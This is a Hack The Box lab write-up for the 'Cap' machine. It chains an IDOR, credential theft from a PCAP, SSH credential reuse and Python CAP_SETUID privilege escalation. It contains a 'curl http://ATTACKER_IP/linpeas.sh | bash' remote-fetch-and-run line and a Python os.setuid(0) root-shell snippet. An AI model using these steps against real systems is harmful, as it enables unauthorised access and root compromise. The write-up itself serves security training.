# Hack The Box | Machine — Cap

**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web / Privilege Escalation

## Overview

Cap is an Easy Linux machine that demonstrates a complete attack chain starting from a web application vulnerability and ending with local privilege escalation.

The main attack path was:

```text
Web Enumeration
      ↓
IDOR
      ↓
Unauthorized PCAP Download
      ↓
Credential Exposure
      ↓
Credential Reuse
      ↓
SSH Access
      ↓
LinPEAS Enumeration
      ↓
Linux Capability Abuse
      ↓
CAP_SETUID
      ↓
Root
```

---

## 1. Web Enumeration

After enumerating the target, a web application was discovered.

The application exposed a `/data/<id>` endpoint that appeared to reference different resources.

For example:

```text
http://TARGET/data/1
```

Since the resource was identified using a numeric ID controlled by the client, I tested whether changing the ID would allow access to other resources.

The initial request was:

```text
/data/1
```

I then changed the identifier:

```text
/data/2
```

This redirected back to the main page.

I then tested:

```text
/data/0
```

This returned a different resource.

This behavior indicated that the application was not properly enforcing authorization when accessing resources by their ID.

### Finding

**Insecure Direct Object Reference (IDOR)**

The application allowed access to another object by modifying a predictable object identifier.

---

## 2. IDOR → PCAP File

The resource obtained through the IDOR could be downloaded.

The downloaded file was a packet capture:

```text
.pcap
```

At this point, the important question was:

> What sensitive information could be contained inside the packet capture?

The PCAP was opened in Wireshark for further analysis.

---

## 3. PCAP Analysis

The packet capture contained FTP traffic.

FTP authentication was visible in plaintext, allowing the username and password to be recovered.

The credentials belonged to:

```text
Username: nathan
Password: <REDACTED>
```

The important observation here was that the IDOR did not directly provide shell access.

Instead, it provided an artifact that contained sensitive authentication material.

The attack chain had therefore become:

```text
IDOR
  ↓
Unauthorized PCAP access
  ↓
FTP traffic
  ↓
Credential exposure
```

---

## 4. Credential Reuse → SSH

I first attempted to use the recovered credentials against the FTP service.

The FTP authentication did not work.

Instead of immediately assuming that the credentials were invalid, I considered whether the same credentials might have been reused for another service.

SSH was available on the target, so the credentials were tested there:

```bash
ssh nathan@TARGET
```

The authentication was successful.

This provided an interactive shell as:

```text
nathan
```

The user flag was then obtained.

The attack chain was now:

```text
IDOR
  ↓
PCAP
  ↓
FTP credentials
  ↓
Credential reuse
  ↓
SSH
  ↓
nathan
```

---

# 5. Privilege Escalation Enumeration

After obtaining a low-privileged shell, the next objective was to identify possible privilege escalation vectors.

I used **LinPEAS** to automate local enumeration.

On the attacking machine, a temporary HTTP server was started:

```bash
sudo python3 -m http.server 80
```

From the target:

```bash
curl http://ATTACKER_IP/linpeas.sh | bash
```

The command works by downloading `linpeas.sh` from the attacking machine and piping the output directly into Bash.

The basic flow is:

```text
Attacker
   |
   | HTTP GET /linpeas.sh
   v
Target
   |
   | Execute script
   v
LinPEAS
```

---

# 6. Linux Capabilities

LinPEAS reported an interesting configuration:

```text
/usr/bin/python3.8
cap_setuid
cap_net_bind_service
```

The important capability was:

```text
CAP_SETUID
```

Linux capabilities allow specific privileged operations to be granted to a process without giving it all root privileges.

`CAP_SETUID` allows a process to perform operations related to changing its UID.

Normally, the low-privileged user would not be able to simply change its UID to root:

```text
UID 0 = root
```

However, Python had been granted `CAP_SETUID`.

This meant Python could potentially be abused to change the process UID to `0`.

---

# 7. Exploiting CAP_SETUID

Python provides access to the operating system's `setuid()` functionality through the `os` module.

The following Python code was used:

```python
import os

os.setuid(0)
os.system("/bin/bash")
```

The important part is:

```python
os.setuid(0)
```

`0` represents the root UID.

Once the process had UID 0, Bash could be launched:

```python
os.system("/bin/bash")
```

The resulting shell had root privileges.

The privilege escalation chain was:

```text
Python
  ↓
CAP_SETUID
  ↓
os.setuid(0)
  ↓
UID 0
  ↓
/bin/bash
  ↓
root
```

The root flag was then obtained.

---

# 8. Complete Attack Chain

```text
                    Web Application
                           |
                           v
                      /data/<ID>
                           |
                           v
                         IDOR
                           |
                           v
                  Unauthorized PCAP
                           |
                           v
                    Wireshark
                           |
                           v
              FTP Credential Exposure
                           |
                           v
                 Credential Reuse
                           |
                           v
                       SSH Access
                           |
                           v
                    nathan shell
                           |
                           v
                       LinPEAS
                           |
                           v
               Python CAP_SETUID
                           |
                           v
                    os.setuid(0)
                           |
                           v
                     Root Shell
```

---

# 9. Vulnerabilities and Weaknesses

## IDOR

The web application allowed resources to be accessed by manipulating a predictable numeric identifier without properly validating authorization.

**Impact:** Unauthorized access to a PCAP file containing sensitive information.

---

## Sensitive Information Disclosure

The exposed PCAP contained plaintext FTP authentication traffic.

**Impact:** An attacker who obtained the PCAP could recover valid credentials.

---

## Credential Reuse

The credentials recovered from the PCAP were reused for SSH authentication.

**Impact:** Credentials exposed through one service could be used to gain access to another service.

---

## Linux Capability Misconfiguration

Python was configured with:

```text
CAP_SETUID
```

This allowed a low-privileged user to execute Python code capable of changing the process UID to `0`.

**Impact:** Local privilege escalation to root.

---

# 10. Key Takeaways

The most valuable lesson from this machine was not a single vulnerability.

The important part was understanding how individual findings could be chained together.

```text
Finding
   ↓
What capability does this give me?
   ↓
Can I obtain sensitive information?
   ↓
Can that information become credentials?
   ↓
Can those credentials cross another trust boundary?
   ↓
After gaining access, what privilege boundaries exist?
```

The final attack path was:

```text
IDOR
→ PCAP
→ Credential Exposure
→ Credential Reuse
→ SSH
→ Linux Capability
→ CAP_SETUID
→ Root
```

This machine was a useful exercise in moving from **individual vulnerability discovery** toward **attack-chain reasoning**.